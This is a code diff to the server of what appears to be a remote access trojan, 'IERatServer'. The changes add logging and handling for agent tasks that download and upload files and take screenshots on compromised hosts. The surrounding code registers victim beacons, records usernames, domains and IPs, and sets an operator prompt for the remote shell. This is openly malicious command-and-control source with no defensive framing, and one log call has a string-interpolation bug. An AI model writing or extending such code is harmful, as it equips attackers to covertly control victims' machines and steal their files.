@@ -15,8 +15,13 @@ namespace IERatServer
             // change on true for ssl , should work on linux
             // for windows use - https://github.com/jchristn/WatsonWebserver/wiki/Using-SSL-on-Windows
             Server s = new(IP, Port, false, DefaultRoute);
-            try { s.Start(); }
-            catch (Exception ex) { Console.WriteLine(ex.GetBaseException().Message); }
+            try { s.Start();
+                Logger.Log("info", $"Server Started at address {IP}:{Port}");
+            }
+            catch (Exception ex) { 
+                Console.WriteLine(ex.GetBaseException().Message);
+                Logger.Log("error", ex.GetBaseException().Message);
+            }
         }
 
         [StaticRoute(HttpMethod.POST, "/api/v1/fetch")]
@@ -30,21 +35,30 @@ namespace IERatServer
                 // print command results and save to history
                 foreach (TaskObject taskObject in requestObject.CompletedTasks)
                 {
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"\nCommand Output received [{taskObject.Type} {taskObject.args}]: {taskObject.Result}\n");
-                    Console.ForegroundColor = ConsoleColor.White;
-                    Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestObject.AgentID, task = taskObject });
-
-                    if (taskObject.Type == "cd")
+                    if ((taskObject.Type == "download") || (taskObject.Type == "upload") || (taskObject.Type == "screenshot"))
                     {
-                        AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
-                        var agent = ActiveChannel.agent;
-                        if (ActiveChannel != null)
+                        Actions.HandleAdvancedTasks(requestObject, taskObject);
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine($"\nCommand Output received [{taskObject.Type} {taskObject.args}]: {taskObject.Result}\n");
+                        Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} {taskObject.args}]: {taskObject.Result}");
+                        Console.ForegroundColor = ConsoleColor.White;
+                        Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestObject.AgentID, task = taskObject });
+
+                        if (taskObject.Type == "cd")
                         {
-                            agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
-                            CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                            AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
+                            var agent = ActiveChannel.agent;
+                            if (ActiveChannel != null)
+                            {
+                                agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
+                                CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                            }
                         }
                     }
+                   
                 }
 
                 if (Db.GetChannelFromID(requestObject.AgentID) != null) { Db.GetChannelFromID(requestObject.AgentID).UpdateHeartBeatTime(); }
@@ -62,6 +76,7 @@ namespace IERatServer
             catch (Exception ex)
             {
                 Console.WriteLine("\nError - " + ex.Message);
+                Logger.Log("error", $"ex.Message");
             }
         }
 
@@ -84,6 +99,7 @@ namespace IERatServer
                     Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
                     Console.ForegroundColor = ConsoleColor.Blue;
                     Console.WriteLine($"\nNew agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
+                    Logger.Log("info", $"New agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]");
                     Console.ForegroundColor = ConsoleColor.White;
                 }
                 var responseString = JsonConvert.SerializeObject(responseObject);
@@ -92,6 +108,7 @@ namespace IERatServer
             catch (Exception ex)
             {
                 Console.WriteLine("\nError - " + ex.Message);
+                Logger.Log("error", ex.Message);
             }
         }
         static async Task DefaultRoute(HttpContext ctx)
